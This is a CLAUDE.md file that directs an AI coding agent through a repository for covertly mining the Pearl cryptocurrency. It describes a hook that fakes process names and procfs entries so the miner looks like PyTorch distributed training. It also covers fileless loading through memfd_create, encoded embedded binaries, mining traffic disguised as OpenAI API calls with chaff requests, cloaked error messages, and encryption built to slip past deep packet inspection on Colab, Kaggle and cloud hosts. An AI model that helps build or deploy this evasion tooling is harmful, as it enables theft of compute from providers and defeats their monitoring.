# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Repository Overview

This repository is a high-performance, stealth-enabled computing ecosystem for Pearl cryptocurrency mining (ZK-PoW algorithm). It integrates native CUDA/C++ compute backends, multiple OpenAI-compatible disguise proxy layers, standalone in-memory packaging, deployment automation, and a Google Colab Model Context Protocol (MCP) server.

### Key Components

- **CPPminer (`CPPminer/`)**: C++17 compute engine providing both a standalone executable (`cppminer`) and a dynamic shared library (`torch_cuda_backend.so`). Supports CPU (AVX2/OpenMP), NVIDIA CUDA (CUTLASS Sm75 TensorOp MMA / Sm61 SIMT), and OpenCL backends. Features Rust C-FFI proof verification (`rust/cp-proof-ffi`) and hardcoded 0% DevFee (100% user shares).
- **Standalone 1-Click Miner (`app/app.py`)**: Self-contained runner embedding zlib+base85 encoded precompiled libraries (`torch_cuda_backend.so`, `stealth_hook.so`), local Stratum bridge, Linux in-memory execution via `memfd_create`, and PyTorch DDP training telemetry disguise.
- **Stealth Hook (`CPPminer/stealth_hook.c`)**: Dynamic C shared library injected into process memory space to intercept procfs (`/proc/self/maps`, `/proc/self/cmdline`, `/proc/self/comm`, `/proc/self/exe`) and NVML driver calls (`nvmlSystemGetProcessName`), disguising the process as `/usr/bin/python3 -m torch.distributed.run`.
- **Koyeb Stealth Proxy (`koyeb-app/`)**: Python/Asyncio OpenAI REST/SSE disguise proxy utilizing standard library only. Implements 1-to-1 persistent Stratum pool connections, Kryptex Stratum Gzip v2 protocol (deflate level 4, mode 31), and a real-time web dashboard.
- **pearl-proxy (`pearl-proxy/`)**: High-throughput Rust/Axum proxy disguising Stratum pool traffic as OpenAI API endpoints (REST completions and SSE chat streams) with Tokio mpsc/broadcast channels.
- **E2E WebSocket Proxy (`e2e-ws-proxy/`)**: Dual-mode client bridge and server proxy with ChaCha20-Poly1305 / AES-CTR + HMAC-SHA256 AEAD encryption over WebSockets, bypassing Deep Packet Inspection (DPI).
- **colab-mcp (`colab-mcp/`)**: FastMCP Python server bridging local AI development agents to Google Colab browser sessions via `jupyter-kernel-client`.

---

## Development Commands

### 1. Standalone Miner (`app/app.py`) & Builder

- **One-Command Autonomous Build & Packaging (Linux / Colab / Kaggle)**:
  ```bash
  chmod +x build_standalone.sh
  ./build_standalone.sh
  ```
  *(Detects GPU architecture `sm_75`/`sm_80`/`sm_86`/`sm_89`, compiles CUDA CUTLASS and stealth hook, and packages into `app/app.py`).*

- **Run Standalone Miner**:
  ```bash
  python3 app/app.py --devices 0,1 --row-batch 128 --worker my_rig
  ```
- **Offline Alignment & Mock Tests**:
  ```bash
  # Bit-to-bit verification against CPU reference
  python3 app/app.py --align-test-prod
  # Mock difficulty share submission & proof verification test
  python3 app/app.py --mock --mock-diff 1.0
  # Maximum matrix scan benchmark
  python3 app/app.py --devices 0 --mock --mock-diff 1000000000 --max-nonce 4
  ```

---

### 2. CPPminer (`CPPminer/`)

#### Build
- **Linux/macOS (Bash)**:
  ```bash
  cd CPPminer
  ./build.sh --backend cpu
  # CUDA build with specific architecture (e.g. sm_75 for T4, sm_89 for Ada Lovelace):
  ./build.sh --backend cuda --cuda-arch 75
  # Multi-backend build:
  ./build.sh --backend cpu,cuda,opencl --cuda-arch 75
  ```
- **Windows (PowerShell)**:
  ```powershell
  cd CPPminer
  powershell -ExecutionPolicy Bypass -File build.ps1 -Backend Cpu
  powershell -ExecutionPolicy Bypass -File build.ps1 -Backend Cpu,Cuda,OpenCl -CudaArch 75
  ```
- **Direct CMake Build**:
  ```bash
  cmake -S CPPminer -B CPPminer/build -DCP_ENABLE_CPU=ON -DCP_ENABLE_CUDA=ON -DCP_CUDA_ARCH=75
  cmake --build CPPminer/build --config Release
  ```
  *(Builds both executable `cppminer` and dynamic library `torch_cuda_backend`).*

#### Run & Test
- **Offline Verification**:
  ```powershell
  .\cppminer.exe --backend cuda --mock
  .\cppminer.exe --backend cuda --align-test-prod
  ```
- **Live Mining**:
  ```powershell
  .\cppminer.exe --backend cuda --pool stratum+tcp://<host>:<port> --wallet <address> --worker <worker_name>
  ```
- **Rust Proof FFI Tests (`rust/cp-proof-ffi`)**:
  ```bash
  cd CPPminer/rust/cp-proof-ffi
  # Run all tests
  cargo test --release
  # Run single test
  cargo test --release -- round_trip_bincode_header
  ```
- **Rebundle Standalone Runner**:
  ```bash
  cd CPPminer
  python3 bundle_main.py
  ```

---

### 3. Rust Stealth Proxy (`pearl-proxy/`)

- **Build**:
  ```bash
  cargo build --manifest-path pearl-proxy/Cargo.toml --release
  ```
- **Run Tests**:
  ```bash
  # Run all tests
  cargo test --manifest-path pearl-proxy/Cargo.toml
  # Run single test by name
  cargo test --manifest-path pearl-proxy/Cargo.toml -- <test_name>
  ```
- **Run Proxy Server**:
  ```bash
  cargo run --manifest-path pearl-proxy/Cargo.toml --release -- \
    --listen 0.0.0.0:8000 \
    --pool prl.kryptex.network \
    --pool-port 7048 \
    --wallet <address> \
    --admin-pass <admin123>
  ```

---

### 4. Koyeb Python Stealth Proxy (`koyeb-app/`, `deploy/`)

- **Run Koyeb Proxy Locally (Python stdlib only)**:
  ```bash
  python koyeb-app/server.py
  ```
- **Run Local OpenAI Miner Bridge**:
  ```bash
  python deploy/openai_miner_bridge.py --port 3333 --proxy http://127.0.0.1:8000 --wallet <address> --worker <worker_id>
  ```
- **Deploy to Koyeb Cloud**:
  ```powershell
  python deploy_koyeb_now.py
  ```
- **Check Proxy / Pool Stats**:
  ```powershell
  python check_proxy_stats.py
  python check_kryptex_live_api.py
  ```

---

### 5. E2E WebSocket Proxy (`e2e-ws-proxy/`)

- **Install Dependencies**:
  ```bash
  pip install -r e2e-ws-proxy/requirements.txt
  ```
- **Run Server**:
  ```bash
  python e2e-ws-proxy/server/server.py
  ```
- **Run Client Bridge**:
  ```bash
  python e2e-ws-proxy/client/bridge.py --local-port 3333 --proxy wss://<proxy-host> --wallet <address> --worker <worker_id>
  ```

---

### 6. colab-mcp (`colab-mcp/`)

- **Environment Setup**:
  ```bash
  cd colab-mcp && uv sync
  ```
- **Run MCP Server**:
  ```bash
  cd colab-mcp && uv run colab-mcp
  ```
- **Run Tests**:
  ```bash
  cd colab-mcp && uv run pytest
  # Run single test file or specific test case
  cd colab-mcp && uv run pytest tests/session_test.py
  cd colab-mcp && uv run pytest tests/session_test.py -k test_name
  ```
- **Code Linting & Formatting**:
  ```bash
  cd colab-mcp
  uv run ruff check .
  uv run ruff format .
  ```

---

## High-Level Architecture & Protocol Details

### Mining Data Flow Pipeline
```
[Stratum Pool (prl.kryptex.network:7048)]
             ▲
             │ (Stratum Gzip v2 JSON-RPC TCP)
             ▼
[Stealth Proxy Layer]
  - koyeb-app (Python/Asyncio REST + SSE)
  - pearl-proxy (Rust/Axum high-concurrency)
  - e2e-ws-proxy (ChaCha20-Poly1305 WebSocket)
             ▲
             │ (HTTP / SSE / WebSocket encrypted)
             ▼
[Local Miner Bridge] (Inside app.py or openai_miner_bridge.py)
             ▲
             │ (In-memory C FFI / Local loopback TCP)
             ▼
[Compute Engine: torch_cuda_backend.so]
  - CUTLASS INT8 GEMM (Turing sm_75 / Ampere sm_86 / Ada sm_89)
  - zk-pow Rust FFI Proof Generation
  - Stealth Hook (procfs / NVML masking as PyTorch DDP)
```

### Kryptex Stratum Gzip v2 Protocol
- **Authorization**: Sends `mining.authorize` with `"type": "v2"`.
- **Zlib Deflate Mode 31**: Base64 plain proof payloads (~20 KB) are compressed with zlib deflate mode 31 (`wbits=31`, standard gzip magic `0x1F, 0x8B`) down to ~100 bytes before submission in `mining.submit`. Fast pre-allocated level 4 compressor is used to eliminate per-share memory allocation overhead.
- **Difficulty Tracking**: Pool updates difficulty via `mining.set_difficulty`, which the proxy and bridge relay to `CPPminer` to synchronize internal target hashes (`g_diff`).

### Stealth OpenAI HTTP/SSE Camouflage
- **Upstream**: 1-to-1 persistent TCP Stratum connection per worker guarded by asynchronous locks.
- **Downstream SSE Stream (`/v1/chat/completions`)**: Jobs from `mining.notify` are serialized into synthetic SSE chat completion chunks formatted as `JOB:<job_id>:<header>:<target>:<diff>:<cert_version>:<height>`.
- **Downstream Embeddings (`/v1/embeddings`)**: Nonce solutions from `mining.submit` are submitted disguised as embedding inputs `SUBMIT:<job_id>:<compressed_proof>:<hashrate>`.
- **Background Traffic Chaff**: Miner bridge periodically queries `/v1/models` to blend mining traffic into regular LLM API calls.

### Multi-Layer Anti-Detection Architecture
- **In-Memory Anonymous Execution (`memfd_create`)**: Native shared libraries are loaded directly into RAM via Linux `SYS_memfd_create` with `MFD_CLOEXEC | MFD_ALLOW_SEALING`, leaving 0 files on disk.
- **Procfs & Driver Hooking (`stealth_hook.c`)**: Intercepts `fopen`, `open`, `readlink`, and NVML's `nvmlSystemGetProcessName` to sanitize `/proc/self/maps` and spoof process telemetry as `python3 -m torch.distributed.run`.
- **Traceback & Exception Cloaking**: Python `sys.excepthook` intercepts runtime errors and formats them as standard PyTorch FlashAttention / NCCL communication timeouts.

### CPPminer Acceleration & 0% DevFee
- **CUDA TensorOp (`src/cuda/cutlass/`)**: Accelerates INT8 GEMM on Turing (`sm_75`), Ampere (`sm_86`), and Ada Lovelace (`sm_89`) GPUs using CUTLASS Tensor Core MMA instructions (`Gemm128x128RowMajorTensorOp` / `Gemm128x128StepMajorTensorOp`).
- **Persisting L2 Cache Optimization**: Configures persisting L2 cache window (up to 72 MB on Ada architectures) and tunes `row_period_batch=128` for cache residency.
- **CPU Overhead Elimination**: Configures `cudaEventBlockingSync` and `cudaDeviceScheduleBlockingSync` to yield CPU time-slices during kernel execution, dropping host CPU utilization from 100% busy-spin down to near 0%.
- **SIMT Fallback**: Fallback kernels (`Gemm128x128RowMajor` / `Sm61`) for Pascal/Volta architectures.
- **Rust C-FFI (`rust/cp-proof-ffi/`)**: Bridges `zk-pow` and `pearl-blake3` crates to generate and verify plain proofs before submission.
- **0% DevFee Core**: Hardcoded `g_enabled = 0` in `cp_fee.cpp` and `cp_fee_init(wallet, 0)` in `main.cpp` ensure 100% of mined shares go directly to the configured user wallet.
